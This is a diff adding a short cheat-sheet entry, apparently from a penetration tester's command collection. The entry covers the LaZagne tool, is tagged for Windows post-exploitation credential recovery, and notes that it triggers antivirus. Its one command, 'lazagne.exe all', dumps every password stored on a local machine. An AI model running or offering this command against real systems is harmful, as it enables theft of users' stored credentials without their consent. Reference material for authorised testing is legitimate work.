@@ -1,0 +1,11 @@
+name:  Lazagne
+tags: [lazagne, dump password]
+data: |
+  
+  lazagne dump all passwords (trig av)
+  plateform/windows  #target/local  #cat/POSTEXPLOIT/CREDS_RECOVER 
+  
+  ```
+  lazagne.exe all
+  ```
+  
